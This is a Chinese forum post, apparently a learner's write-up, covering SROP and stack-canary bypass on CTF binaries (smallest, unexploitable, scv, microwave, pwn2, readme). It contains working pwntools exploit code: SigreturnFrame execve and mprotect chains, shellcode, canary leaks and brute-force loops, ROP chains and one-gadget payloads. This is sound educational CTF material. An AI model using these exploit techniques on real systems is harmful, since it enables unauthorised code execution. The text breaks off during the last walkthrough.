> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-268716.htm)

> [原创] 新人 PWN 入坑总结 (四)

话不多说，接上文

SROP0x08
========

一、360ichunqiu 2017-smallest  

------------------------------

1. 常规 checksec，开了一个 NX，没办法 shellcode。IDA 打开查看程序，找漏洞，有个屁的漏洞，只有一个 syscall 的系统调用，各种栈操作也没有。

2. 观察这个系统调用，系统调用参数通过 edx,rsi,rdi 赋值，edx 直接被赋值为 400h，buf 对应的 rsi 被 rsp 赋值，系统调用号 fd 对应的 rdi 被 rax 赋值。再查看汇编代码，有 xor rax,rax，所以 rax 一定是 0，那么这个 syscall 系统调用的就是 read 函数，读取的数取直接存入栈顶。由于 buf 大小为 400h，且只有一个 syscall，之后直接 retn，没有 leave 指令，这就代表了 rsp 指向的地址就是我们执行完 syscall 后 start 函数 retn 的返回地址 (pop eip)。也就是如果输入一个地址，读取完之后，通过 retn 就会跳转到该地址中。另外程序中除了 retn 之外没有其它对栈帧进行操作的指令，如果输入多个 syscall 地址，就可以反复执行 syscall。并且最开始输入 400h 字节，程序流完全可控。

![](https://bbs.pediy.com/upload/attach/202108/904686_NH6MJ62VZ5VBZT6.jpg)

3. 首先想到 rop，但是题目没给 Libc，并且通过调试发现，这个程序压根就没导入外部的 Libc 库，IDA 中打开没有 extern，完全没办法常规 rop，那么想用 SROP。远程调试一下查看堆栈数据，发现临时创建的 smallest 段数据没有可写权限，能够利用的只有 [stack] 栈数据。所以这里需要先泄露一个栈地址来让我们能够往栈中写入数据 binsh 从而调用 execve(‘/bin/sh\x00’，0，0)来直接 getshell。

![](https://bbs.pediy.com/upload/attach/202108/904686_DC8YXUCSRRPT5YU.jpg)

4. 之后观察栈上的数据，发现当运行到 syscall 时，rsp 下方的内容全是栈上的地址。

![](https://bbs.pediy.com/upload/attach/202108/904686_6CSM8772JNDWTKW.jpg)

rbp 一直都是 0x000...... 这是因为程序只有一个 start 函数，根本就没有为函数再次创建栈，所用的只是最初生成的栈空间。根据这个原理，我们可以通过系统调用 sys_write 函数，来打印 rsp 指向的内容，也就是某个栈地址，这样就成功泄露栈地址。

5. 但是 sys_write 的调用号是 1，而通过调试发现 rax 的初始值被默认设置为 0，并且程序中没有任何修改 rax 的代码。唯一一个也只有 xor     rax, rax，但是任何数和本身异或的结果都是 0，所以如果程序每次都从这行代码执行，那么执行的系统调用号永远都是 0，也就是会无限循环 read。这里想到由于栈完全可控，并且输入一个地址，程序执行完这个地址对应的函数后 retn 会直接跳转到 rsp 的下一行。这里选择让程序再执行一次 sys_read 函数，之后我们为其中一次输入一个字节，并且这次返回不再从 xor 这行代码开始执行，从 mov rsi, rsp 开始。由于 sys_read 的返回值自动写回给 rax(一般函数的返回值都会写给 rax)，所以读取几个字节 read 就向 rax 写入多少，这样就会使得 rax 也可以得到控制，不再被 xor 为 0，调用我们想调用的系统函数。

6. 所以编写 payload: 先尝试一下看能否泄露栈地址，test1.py

```
#注释头
 
payload = ""
payload += p64(start_addr)
payload += p64(set_rsi_rdi_addr)
payload += p64(start_addr)
#泄露栈地址之后返回到start，执行下一步操作。
io.send(payload)
sleep(3)
io.send(payload[8:8+1])

```

#利用 sys_read 随便读取一个字符，设置 rax = 1，由于 retn 关系，rsp 下拉了一个单位，所以这里会读入到原先的 rsp+0x8 处，也就是从原先的 Payload 中第 8 个字符开始，抽取一个字符，就是 set_rsi_rdi_addr 的最后一个字节，为了不改变返回地址。如果写成：io.send(‘\xb8’) 效果一样，都是为了不改变返回地址。之后再执行 set_rsi_rdi_addr 从而执行 write 函数，

```
#注释头
 
stack_addr = u64(io.recv()[8:16]) + 0x100
#从最初的rsp+0x10开始打印400字节数据，那么从泄露的数据中抽取栈地址，+0x100防止栈数据过近覆盖
log.info('stack addr = %#x' %(stack_addr))

```

7. 这里可以看到成功泄露了一个栈地址，但是不能再用简单读入 binsh 字符串之后设置 SigreturnFrame 结构体来 getshell，因为这里设置读入地址是通过 rsp 设置的。如果将 rsp 设置为我们想读入 binsh 的栈地址，那么肯定是可以读入 binsh 字符串的，但是当程序运行到 retn 时，跳转的是 binsh 这个地址，这是不合法的，没办法跳转，程序会崩溃。

这里就考虑使用 SigreturnFrame() 来进行栈劫持，将整个栈挪移到目的地。

(1) 首先布置 SigreturnFrame() 的栈空间，进行栈劫持：

```
#注释头
 
frame_read = SigreturnFrame() 
#设置read的SROP帧，不使用原先的read是因为可以使用SROP同时修改rsp，实现stack pivot
frame_read.rax = constants.SYS_read        #调用read读取payload2
frame_read.rdi = 0                         #fd参数
frame_read.rsi = stack_addr                #读取payload2到rsi处
frame_read.rdx = 0x300                     #读取长度为0x300
#读取的大小
frame_read.rsp = stack_addr                #设置SROP执行完的rsp位置
#设置执行SROP之后的rsp为stack_addr，里面存的是start_addr，retn指令执行后从start开始。
frame_read.rip = syscall_addr              #设置SROP中的一段代码指令

```

(2) 发送 payload。

```
#注释头
 
payload1 = ""
payload1 += p64(start_addr)        #读取payload[8:8+15]，设置rax=0xf0
payload1 += p64(syscall_addr)      #利用rax=0xf0,调用SROP
payload1 += str(frame_read)
io.send(payload1)
sleep(3)
io.send(payload1[8:8+15])
#为rax赋值为0xf0
sleep(3)

```

程序运行 SROP 过程中，会执行 read 函数，将 payload2 读取到 stack_addr 处，所以当程序运行完 SROP 后，栈顶 rsp 被劫持到 stack_addr 处，同时 stack_addr 上保存的内容是 payload2，首地址是 start，所以 retn 执行后仍旧从 start 开始。

(3) 设置第二次的 SigreturnFrame 攻击：

```
#注释头
 
frame_execve = SigreturnFrame()
#设置execve的SROP帧，注意计算/bin/sh\x00所在地址
frame_execve.rax = constants.SYS_execve
frame_execve.rdi = stack_addr+0x108
frame_execve.rip = syscall_addr

```

这里的 0x108 是计算出来的，需要计算从 stack_addr 到 rdi，也就是 binsh 字符串的距离。由于传进去的是结构体，大小为 0xf8。前一个例子中 binsh 字符串是放在 str(frameExecve) 之前，所以没有那么大。这里却是放在 str(frame_execve) 之后，所以从 stack_addr 为起始，start_addr，syscall_addr，frame_execve)，总共为 0xf8+0x08*2=0x108，这里不太懂可以调试一下看看。也就是再一次 start_addr 读取字符串 binsh 的位置。

8. 发送 payload，读取 binsh 字符串，getshell：

```
#注释头
 
payload2 = ""
payload2 += p64(start_addr)          #处在stack_addr处，读取payload[8:8+15]，设置rax=0xf0
payload2 += p64(syscall_addr)        #处在stack_addr+0x08,利用rax=0xf0,调用SROP
payload2 += str(frame_execve)        #处在stack_addr+0x10
payload2 += "/bin/sh\x00"            #处在stack+0x108处
io.send(payload2)
sleep(3)
io.send(payload2[8:8+15])
sleep(3)
io.interactive()

```

9. 尝试使用 mprotect 为栈内存添加可执行权限 x，从而 shellcode 来 getshell。

(1) 第一段的劫持栈和读取 payload2 进入劫持栈处都是一样的

```
#注释头
 
frame_read = SigreturnFrame()            #设置read的SROP帧
frame_read.rax = constants.SYS_read
frame_read.rdi = 0
frame_read.rsi = stack_addr
frame_read.rdx = 0x300
frame_read.rsp = stack_addr
#读取payload2，这个stack_addr地址中的内容就是start地址，SROP执行完后ret跳转到start
frame_read.rip = syscall_addr

```

(2) 第二段需要调用 mprotect 来修改权限：

```
#注释头
 
frame_mprotect = SigreturnFrame()
#设置mprotect的SROP帧，用mprotect修改栈内存为RWX
frame_mprotect.rax = constants.SYS_mprotect
frame_mprotect.rdi = stack_addr & 0xFFFFFFFFFFFFF000
frame_mprotect.rsi = 0x1000
frame_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
#权限为R,W,X
frame_mprotect.rsp = stack_addr
#劫持栈地址rsp
frame_mprotect.rip = syscall_addr

```

(3) 最后的 shellcode:

```
#注释头
 
payload2 = ""
payload2 += p64(stack_addr+0x10)               #处在stack_addr
#SROP执行完后，ret到stack_addr+0x10处的代码，即执行shellcode
payload2 += asm(shellcraft.amd64.linux.sh())    #处在stack_addr+0x10
io.send(payload2)
sleep(3)
io.interactive()

```

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

二、pwnable.kr-unexploitable
--------------------------

1. 常规 checksec，只开启了 NX。IDA 打开找漏洞，程序很简单，读入数据栈溢出，可以读取 1295 个字节，但是 buf 只有 0x10h 大小，所以可以溢出足够长的数据。

2. 程序没有后门，没有导入 system 函数，没有 binsh 字符串，也没有 write、put、printf 之类的可以泄露 libc 的函数，没办法 ROP，然后 ROPgadget 也搜不到 syscall。这里换用另一种工具 ropper 来搜索：ropper --file=unexploitable --search "syscall"，可以搜到一个。有了 syscall，可以尝试用 rop 来给寄存器赋值然后开 shell，但是这里还是搜不到给 rsi，rdi 等寄存器赋值的 gadget，这就意味着我们也没办法直接通过 ROP 实现 getshell。

3. 如果没有开 NX，直接栈劫持然后 shellcode 就完事了，但是开启了 NX，没办法 shellcode。

4. 啥也不管用的时候，可以用 SROP，也就是通过 syscall 再利用 SigreturnFrame 来设置寄存器 rsi 和 rid 的值，加上字符串 binsh 可以直接 getshell，不用非得设置 rsi,rdi 寄存器值的 rop。但是这里使用 SigreturnFrame 有限制，需要溢出的长度较长一些，32 位下需要依顺序布置栈，64 位条件下需要往栈中布置一个结构体，所以需要输入足够长的 payload 来修改。

5. 这里使用的方案是 SigreturnFrame，先考虑一段足够长的可修改的内存地址来给我们存放栈劫持的内容。但是在 IDA 中按 ctrl+s 查看内存段，发现所有的可改可读的内存段都特别小，没办法存放足够长的溢出内容。这里忽略了一个知识点，临时创建的缓存：也就是我们使用 read(0, &buf, 0x50FuLL); 时，会临时创建一个长度为 0x50F 的缓存区间，这个区间足够满足我们的需求，但是在 IDA 中找不到，那就没办法栈劫持到这个位置。这里可以先动态调试一下，由于没有开启 PIE，程序加载后的基地址是固定的，所以无论程序加载多少次，地址仍然不会发生改变。那么转向动态调试，可以看到程序冒出来一个可读可写的内存段：unexploitable，这个就是临时创建的一个缓存区间，长度为 F88，足够用来执行操作。

![](https://bbs.pediy.com/upload/attach/202108/904686_487SUFMESAWU629.jpg)

6. 在这个区间上任意选取一个地址来栈劫持，这里选择 0x60116c，然后编写 payload，尝试能否成功栈劫持并且读入 binsh：

```
#注释头
 
payload = ""
payload += 'a'*16               #padding
payload += p64(fake_stack_addr)
#main函数返回时，将栈劫持到fake_stack_addr处，第一次将使得rbp变为fake_stack_addr, rbp + buf为fake_stack_addr - 0x10
payload += p64(set_read_addr)   
#汇编指令为lea rax, [rbp+buf]; mov edx, 50Fh; mov rsi, rax; mov edi, 0; mov eax, 0; call _read的地址处
io.send(payload)

```

这样接下来如果再输入 binsh 字符串，就可以读取到 [rbp+buf] 处。需要注意的是，这里的 set_read_addr 是从下图最开始跳转，如果直接跳转 call read，那么就会由于 read 取参是 edx,rsi,edi，从而导致数据会存入 rsi 指向的地址，没办法存到我们劫持的栈中。观察 read 函数汇编代码可以知道，虽然 read 存入的地址是 rsi，但是 rsi 是通过 rbp+buf 来赋值的，所以我们可以通过修改 rbp 为 fake_stack，使得 rbp+buf 的地址变为 fake_stack 上的某个地址，再执行下图中的代码，就可以使得 read 读取的内容直接进入到劫持栈 rbp+buf 上，也就是 fake_stack 上。

![](https://bbs.pediy.com/upload/attach/202108/904686_7J9K6CFYW4HS58H.jpg)

7. 栈劫持完成之后，考虑第二段的 payload，也就是输入 binsh 字符串和后续内容，来执行 SigreturnFrame，使用：

```
#注释头
 
payload = ""
payload += "/bin/sh\x00"

```

输入字符串 binsh，存放在 fake_stack_addr-0x10 处

```
#注释头
 
payload += 'a'*8 #padding
payload += p64(fake_stack_addr+0x10)#存放在0x60116c处

```

读取完之后，执行 leave 指令之前的栈底为 0x60116c，而 leave 指令相当于：mov rsp rbp；和 pop rbp：

(1) 第一条 mov rsp rbp 之后，0x60116c 就被赋值给 rsp，也就是 rsp 指向 0x60116c。

(2) 第二条 pop rbp 之后，把 0x60116c 处的内容赋值给 rbp，这里设置 0x60116c 处的内容为 fake_stack_addr+0x10，也就是 0x60117c，那么 rbp 指向 0x60117c。rsp 下挪一个单位，指向 0x60116c+0x08=0x601174。

故 leave 指令执行完后 rsp = 0x601174，rbp = 0x60117c。

▲这里这么设置是有原因的，为了挪动 rsp 来指向 0x601174。

```
#注释头
 
payload += p64(call_read_addr)        #存放在0x601174
#存放在0x601174处，为了之后再次调用read修改rax。

```

接着执行 retn 指令，相当于 pop eip，此时的 rsp 指向 0x601174，所以我们需要将 0x601174 处的值变为 read_addr 的地址，也就是这条语句，这里设置 read_addr 为 0x400571，也就是带有 call 指令的 read。

```
注释头
 
payload += p64(fake_stack_addr)#存放在0x60117c，这里可以随便设置，用不到

```

retn 指令之后就是 call 指令，各种寄存器的值还是没变，所以照常用就行，回来之后 rsp 仍旧指向 0x60117c。此时栈状态为：

rsp = 0x60117c，rbp = 0x60117c。

```
#注释头
 
payload += str(frameExecve)#设置SigreturnFrame结构体
 
io.send(payload)
#set_read处的读取
 
sleep(3)
 
 
io.send('/bin/sh\x00' + ('a')*7) 
#call_read处的读取。

```

读取 15 个字符到 0x60115c，目的是利用 read 返回值为读取的字节数的特性设置 rax=0xf，注意不要使 / bin/sh\x00 字符串发生改变。

最后 io.interactive() 即可 getshell。

▲总的程序流应该是：首次 read->set_read->call_read->syscall

结构体的设置，固定模式：

```
#注释头
 
frameExecve = SigreturnFrame() #设置SROP Frame
frameExecve.rax = constants.SYS_execve
frameExecve.rdi = binsh_addr
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall_addr

```

开头设置：

```
#注释头 
 
syscall_addr = 0x400560 
set_read_addr = 0x40055b 
read_addr = 0x400571 
fake_stack_addr = 0x60116c 
binsh_addr = 0x60115c

```

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)  

Canary 绕过 0x09
==============

一、CSAW Quals CTF 2017-scv
-------------------------

1. 常规 checksec，开启了 NX 和 Canary。打开 IDA 发现程序两个漏洞：

(1) 功能 1 中栈溢出：

```
#注释头
 
char buf; // [rsp+10h] [rbp-B0h]
--------------------------------------
v25 = read(0, &buf, 0xF8uLL);

```

(2) 功能 2 中输出字符串：puts(&buf);

注：这里的 put 和 printf 不是同一个概念，不是格式化字符串的函数。但是由于 put 是直接输出我们的输入，而我们的输入被保存在 main 函数栈上，所以可以输入足够多的数据连上 canary，利用 put 一并打印出来，从而把 canary 泄露出来。

2. 调试，IDA 中观察位置，计算偏移，可以知道偏移为 0xB0-0x8=0xA8=168 个字符，(canary 通常被放在 rbp-0x08 的位置处，当然也不一定，最好还是调试一下) 这样就可以构造第一个 payload:payload1 = ”A”*168 + “B”。

这里再加一个 B 是因为 canary 的保护机制，一般情况下 canary 的最后两位也就是最后一个字符都是 \ x00，由于是大端序，所以可以防止不小心把 canary 泄露出来。因为上一个栈内存的最后第一个字符连接的是下一个栈内存的第一个字符，也就是 canary 中的 \ x00，而打印函数默认 00 是字符串的结尾，所以这里如果输入”A”*168，那么打印出来的就只会是 168 个 A，不会将 canary 带出来。所以我们再加一个 B，覆盖掉 canary 在占内存的第一个字符 00，从而能够连接上成为一个完整的字符串打印出来。但又由于是大端序，泄露出来的 canary 应该最后一个字符是 B，对应 \ x42，这里需要修改成 \ x00 从而获得正确的 canary。同理，如果随机化的 canary 中含有 \ x00，那么仍然会导致字符串截断，无法得到正确的 canary。所以其实如果多执行几次，碰到包含 \ x00 的 canary，就会导致程序出错。

泄露加修改：canary = u64('\x00'+io.recv(7))

3. 之后就可以利用 canary 的值和栈溢出，调用 put 函数打印其它函数的实际地址。这里程序使用了 read 函数，并且同时外部调用了 read 函数，可以通过输入 read 的. got 表的值，使其打印 read 函数的真实地址。同时需要注意的是，由于是 64 位程序，传参是从 rdi 开始，所以栈溢出的第一个返回地址应该给 rdi 赋值才对，编写 payload1。

```
#注释头
 
payload1 = ""
payload1 += "A"*168 #padding
payload1 += p64(canary) #在canary应该在的位置上写canary
payload1 += "B"*8 #这一段实际上是rbp的位置
payload1 += p64(pop_rdi)   
#跳转到pop rdi;retn;所在语句(可以通过ROPgadget查询)，来给rdi传入read函数的got表中的地址。
payload1 += p64(read_got) #被pop rdi语句调用，出栈
payload1 += p64(puts_plt)
#retn到put函数的plt表，调用put函数。
payload1 += p64(start)
#调用之后，返回程序最开始，恢复栈帧，再执行一遍程序

```

这样就可以得到 read 的实际地址，从而通过 libc 库计算偏移地址得到基地址。

5. 现在有了 libc 库的基地址，观察 main 函数退出时的汇编代码：mov     eax, 0 可以使用在 2.24libc 库条件下可以使用 onegadget。

6. 直接计算 onegadget 偏移，然后覆盖 main 函数的返回地址，getshell。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

二、insomnihack CTF 2016-microwave
--------------------------------

1. 常规 checksec，程序全部开启保护，并且有 canary 保护，从 IDA 中汇编代码和伪代码也可以看到：

(1) 汇编代码：

①生成 canary 的代码: 一般在函数初始化的时候就可以看到

```
#注释头
 
mov rax,fs:28h
mov [rsp+28h+var_20], rax

```

![](https://bbs.pediy.com/upload/attach/202108/904686_78HA5CDFGDRKZ43.jpg)

②校验:

```
#注释头
 
mov rax, [rsp+28h+var_20]
xor rax, fs:28h
jnz short func

```

![](https://bbs.pediy.com/upload/attach/202108/904686_MVEE2WSCGFGN793.jpg)

(2) 伪代码：

```
#注释头
 
v_canary = __readfsqword(0x28u);
return __readfsqword(0x28u) ^ v_canary;

```

有很多种形式，如下也是一种：

![](https://bbs.pediy.com/upload/attach/202108/904686_GQPTZQTHXRFBCVQ.jpg)

2. 之后查找漏洞，找到两个漏洞：

(1) 功能 1 的 sub_F00 函数中的 printf 存在格式化字符串漏洞：

```
#注释头
 
__printf_chk(1LL, a1);

```

这里的 1LL 不知道是个什么意思，但是实际效果仍然相当于是 printf(a1)，调试中可以知道。

(2) 功能 2 的 sub_1000 存在栈溢出漏洞：

```
#注释头
 
__int64 v1; // [rsp+0h] [rbp-418h]
------------------------------------------------------
read(0, &v1, 0x800uLL);

```

3. 现在是保护全开，栈溢出漏洞因为 canary 的关系没办法利用，唯一能利用的只有一个 printf() 函数，而且还没办法劫持 got 表，没办法进行完全栈操控。所以这里就想能不能通过 printf 函数泄露 canary 从而使得栈溢出这个漏洞派上用场。

4. 首先调试，观察 canary 在栈上的偏移位置，调试断点下在 sub_F00 函数的 printf 函数上，因为这个 sub_F00 函数中也有 canary 的保护，那么该函数栈上一定存在 canary 的值。自己调试如下图：

![](https://bbs.pediy.com/upload/attach/202108/904686_6QC98DRS5EG3PE2.jpg)

IDA 调试界面点击对应生成 canary 的代码 mov   [rsp+28h+var_20], rax 中的 [rsp+28h+var_20] 就可以知道 canary 的位置应该是 rsp+8h 处，这里也可以看出来 V6 就是 canary

另外由于这是 64 位程序，取参顺序是 rdi, rsi, rdx, rcx, r8, r9, 栈，由于 printf() 前两个参数位 rdi,rsi 对应的是 fd 和 & buf，

这里的 buf 就是我们输入的 username，因为 username 的输入保存在堆上 main 函数中有声明：

```
#注释头
 
void *v4; // r12
----------------------------------------------------------------
v4 = malloc(0x3EuLL);
-------------------------------------------------------------------
fwrite(" username: ", 1uLL, 0x15uLL, stdout);
fflush(0LL);
fgets((char *)v4, 40, stdin);
--------------------------------------------------------------------
fwrite(" password: ", 1uLL, 0x15uLL, stdout);
fflush(0LL);
v3 = 20LL;
fgets((char *)v4 + 40, 20, stdin);
------------------------------------------------------------------------
sub_F00((__int64)v4);
--------------------------------------------------------------------
unsigned __int64 __fastcall sub_F00(__int64 a1)
-------------------------------------------------------------------
__printf_chk(1LL, a1);

```

下图是没有打印之前的内容：

![](https://bbs.pediy.com/upload/attach/202108/904686_96CSTP7QDU54UQU.jpg)

我们可以看到 rsi 的值是 5 开头的，这其实就是一个堆内存地址，调试过程中输入跳转就可以看到该地址对应的内容就是我们的输入 username 的值。那么输入 username 时输入多个 %p，触发格式化字符串漏洞，打印寄存器和栈上的内容，泄露出 libc 地址和 canary。printf() 依次根据 %p 打印的参数顺序是 rdx,rcx,r8,r9, 栈。所以 r9 之后第一个打印出来的数据是 rsp-8h，也就是 canary 的值，这样就可以得到泄露的 canary 的值，从而控制栈溢出。同时我们可以发现打印出来的数据中包含 libc 中的函数，这样同时也泄露出来了 libc 加载后的地址，之后通过偏移计算出基地址。

5. 之后进行栈溢出操控，但是这里如果连不上账户会没办法使用 sub_1000 函数，用 IDA 查看可以看到在 sub_f00 函数中对密码进行检查，可直接查看到密码：

![](https://bbs.pediy.com/upload/attach/202108/904686_UE6PDZP9U49QY53.jpg)

这个 off_204010 就是密码，点进去就可以看到。

由之前步骤可以得到 canary 和 libc 基地址。查询之后可以发现由于 retn 前会检查 canary，对应汇编代码是：

xor rax, fs:28h

那么如果 canary 输入成功，xor 之后会使得 rax 一定为 0，满足该 libc 库的 Onegadget 条件，所以这里可以直接使用 Onegadget：

```
#注释头
 
payload = "A"*1032 #padding
payload += p64(canary) #正确的canary
payload += "B"*8 #padding
payload += p64(one_gadget_addr) #one gadget RCE
io.sendline('2') #使用有栈溢出的功能2
io.recvuntil('#> ')
io.sendline(payload)

```

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)  

三、NSCTF 2017-pwn2
-----------------

1. 常规 checksec，开启了 NX 和 canary，IDA 打开找漏洞，sub_80487FA() 函数中存在两个漏洞：

(1) 格式化字符串漏洞：

```
#注释头
 
s = (char *)malloc(0x40u);
sub_804876D(&buf);
sprintf(s, "[*] Welcome to the game %s", &buf);
printf(s)

```

(2) 栈溢出漏洞：

```
#注释头
 
read(0, &buf, 0x100u);

```

2. 由于 canary 的关系，栈溢出没办法利用，但是这里可以通过格式化字符串漏洞直接泄露 canary，之后再实际操作。这里为了学习爆破 canary 的方式，先用爆破的方式来获取 canary。

3. 如果直接爆破 canary，由于 canary 随机刷新，就算去掉最后一个字节 \ x00，在 32 位条件下我们假定一个 canary 的值，那么 canary 随机生成为我们假定的值的概率应该为 1/(2^24-1) 所以从概率上讲应该需要爆破 2^24-1 次，也就是 16,777,215-1 次，而且还只是概率上的期望值，如果不考虑 canary 的实际生成机制，并且运气不好的话，可能无穷大，等爆出来黄花菜都凉了，这鬼能接受。所以一般使用爆破 canary 都需要一个 fork 子进程。

4. 子进程的崩溃并不会影响到父进程，并且由于子进程的数据都是从父进程复制过来的，canary 也一样，只要父进程不结束，子进程无论崩溃多少次其初始化的数据还是父进程的数据，canary 就不会发生改变，这样就为快速爆破 canary 创造了前提。刚好这个程序有 fork 一个子进程：

(1) 观察汇编代码：

![](https://bbs.pediy.com/upload/attach/202108/904686_KNKGEHRJG7RWE2M.jpg)

main 函数主体中先 call fork，由于函数的结果基本都是传给 eax，所以这里的 eax 就代表 fork 的成功与否，返回 ID 代表 fork 成功，然后将调用结果赋值给局部变量 [esp+1ch]，之后拿 0 与局部变量[esp+1ch] 比较。这里涉及到 JNZ 影响的标志位 ZF，CF 等，不细介绍。总而言之就是会 fork 一个子进程，成功就跳转到我们之前说过的有漏洞的函数中，失败则等待，一会然后依据 while 重开程序。

(2) 观察伪代码也可以

▲fork 机制：

1）在父进程中，fork 返回新创建子进程的进程 ID；

2）在子进程中，fork 返回 0；

3）如果出现错误，fork 返回一个负值；

5. 爆破 canary 原理：

(1)最开始我认为就算 canary 不变，那么从 0*24 开始尝试，一直到 canary 的值，那么需要尝试 canary 值这么多次，最少 1 次，最多 2^24 次，就算取期望，那也应该是 (1/2)*(2^24) 次。也没办法接受啊。

(2) 之后看了 canary 的检查机制和生成机制：在 sub_80487FA 汇编代码中：

![](https://bbs.pediy.com/upload/attach/202108/904686_59NC7CWNJ2FDGQS.jpg)

![](https://bbs.pediy.com/upload/attach/202108/904686_KYVANA8PNFEAXMF.jpg)

生成的时候是将栈上指定地方 [ebp+var_C] 给修改成 canary。

检查的时候，是从栈上取 [ebp+var_C] 的值传给 eax 和最开始随机生成的 canary(large gs:14h)来比较，所以当我们用栈溢出的时候，我们可以只溢出一个字节来修改 [ebp+var_C] 的第 1 个字节，(第 0 个字节是 \ x00)，然后启动检查机制。由于只修改了栈上 [ebp+var_C] 的第 1 个字节数据，第 3,2 个字节仍然还是之前被保存的 canary 的值。所以我们获取第 1 个字节需要尝试最少 1 次，最多 2^8 次，平均 (1/2)*(2^8) 次，也就是 128 次，可以接受。之后将爆破成功的第 1 个字节加到栈溢出内容中，再溢出一个字节修改 [ebp+var_C] 上的第 2 个字节，同理，完成爆破需要 128 次，总的来说平均需要 128*3=384 次，完全可以接受。

(3) 爆破一般形式程序，两个循环：

```
#注释头
 
for i in xrange(3):
for j in xrange(256):

```

6. 之后不同程序不太一样，有的程序没有循环，是直接 fork 一个子进程，监听其它端口，这时候只要连接该端口就可以进行爆破，失败了关闭端口就是。

有的程序只是在程序中 fork 一个子进程，但是有循环，那么我们就需要在循环里跑出来 canary。然后直接进行下一步 payload，不然断开连接的话，程序又重新生成 canary，等于没用。

7. 总结一下，程序最开始需要输入 Y，然后跳转到有漏洞的函数 sub_80487FA 中，之后可以获取输入 name，这里的输入的 name 在下一条 [*] Welcome to the game 之后会被打印出来，并且打印的方式存在格式化字符串漏洞。所以可以通过调试，输入 %p 来获取栈上的指定的 libc 地址内容，泄露 libc 从而获取 libc 基地址。

8. 由于每次子程序崩溃后都会从头开始，都需要再输入 Y 和 name，那么直接将该段泄露代码放在爆破循环中即可：

```
canary = '\x00'
for i in xrange(3):
    for j in xrange(256):
        io.sendline('Y')
        io.recv()
        io.sendline('%19$p') #泄露栈上的libc地址
        io.recvuntil('game ')
        leak_libc_addr = int(io.recv(10), 16)
 
        io.recv()
        payload = 'A'*16 #构造payload爆破canary
        payload += canary
        payload += chr(j)
        io.send(payload)
        io.recv()
        if ("" != io.recv(timeout = 0.1)): 
        #如果canary的字节位爆破正确，应该输出两个"[*] Do you love me?"，因此通过第二个recv的结果判断是否成功
            canary += chr(j)
            log.info('At round %d find canary byte %#x' %(i, j))
            break

```

9. 爆破结束后，得到 libc 基地址，canary，以及一个可以利用的栈溢出，程序循环从最开始。那么利用栈溢出返回到 system 函数，由于 32 位程序，栈传参，那么可以提前布置好栈，使得 system 函数直接从我们布置的栈上读取 binsh 字符串，直接 getshell。

```
#注释头
 
log.info('Canary is %#x' %(u32(canary)))
system_addr = leak_libc_addr - 0x2ed3b + 0x3b060
binsh_addr = leak_libc_addr - 0x2ed3b + 0x15fa0f
log.info('System_address:%#x,binsh_addr:%#x'%(system_addr,binsh_addr))
 
payload = ''
payload += 'A'*16
payload += canary
payload += 'B'*12
payload += p32(system_addr)
payload += 'CCCC'
payload += p32(binsh_addr)
 
io.sendline('Y') #[*] Do you love me?
io.recv()
io.sendline('1') #[*] Input Your name please: 随便一个输入
io.recv()
io.send(payload) #[*] Input Your Id: 漏洞产生点
io.interactive()

```

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)  

四、32C3 CTF-readme
-----------------

1. 常规 checksec，开了 NX,Canary,FORTIFY。然后 IDA 找漏洞，sub_4007E0 函数中第一次输入名字时存在栈溢出：

```
#注释头
 
__int64 v3; // [rsp+0h] [rbp-128h]
--------------------------------------------------------------------
_IO_gets(&v3)

```

2. 研究程序，有数据 byte_600D20 提示，点进去提示远程会读取 flag 到这个地方，由于这里有 Canary 和栈溢出，那么我们直接利用 Canary 的检查函数___stack_chk_fail 来泄露程序中 byte_600D20 处的 flag。

3. 前置知识：

(1)libc2.24 及以下的___stack_chk_fail 函数检查到 canary 被修改后，会在程序结束时打印 *** stack smashing detected** ”：[**./readme.bin]** terminate。这里红色的部分就是程序名字，程序初始化时就会读入存储到 argv[0] 这个参数里面。

(需要注意的是，程序最开始读入的是程序的 pwd 绝对路径，类似于 / home/ctf/readme.bin，之后会在___stack_chk_fail 函数中对 argv[0] 中保存的字符串进行拆解，从而只打印出程序名字)

(2) 由于 argv[0] 参数是 main 函数的参数，程序初始化时就存储在栈上的较高地址处，我们的输入肯定是在 main 函数及以后的函数栈中，基本都处于较低地址处，所以一旦栈溢出足够，那么就可以覆盖到 argv[0]，从而将___stack_chk_fail 函数打印程序名字的地方覆盖成我们想要知道的某个地址中的值，这里也就是 flag，byte_600D20。

4. 所以进行足够长度的覆盖，将 argv[0] 覆盖为 0x600d20，但是由于以下函数

```
#注释头
 
byte_600D20[v0++] = v1;
--------------------------------------------------------------------------
memset((void *)((signed int)v0 + 0x600D20LL), 0, (unsigned int)(32 - v0));

```

即使我们覆盖掉了 argv[0]，那么打印出来的也不会是 flag。这里需要用到另一个知识点：

▲动态加载器根据程序头将程序映射到内存，由于程序没开 PIE，所以各段的加载地址均已经固定，flag 位于 0x600D20，处于第二个 LOAD 中，会被映射到内存中的第一个 LOAD 中，所以 0x600D20 处的 flag 即使被覆盖，那么第一个 LOAD 中的 flag 依然存在。所以这里选择将 argv[0] 覆盖为第一个 LOAD 中的 flag。

![](https://bbs.pediy.com/upload/attach/202108/904686_P496QQ7JCS3JPTU.jpg)

第一个 LOAD 中的 flag 寻找方法，peda 可以查找到：

![](https://bbs.pediy.com/upload/attach/202108/904686_DXRMZJDMWGEPRPQ.jpg)

5. 现在考虑寻找 argv[0] 的位置，由于最开始读取的是 pwd 绝对路径，所以利用这个来寻找，将断点下在 b *0x40080E，这里我的绝对路径是 / ctf/AAAAAAAA：

![](https://bbs.pediy.com/upload/attach/202108/904686_WMQ3SD7KMJZ9NA7.jpg)

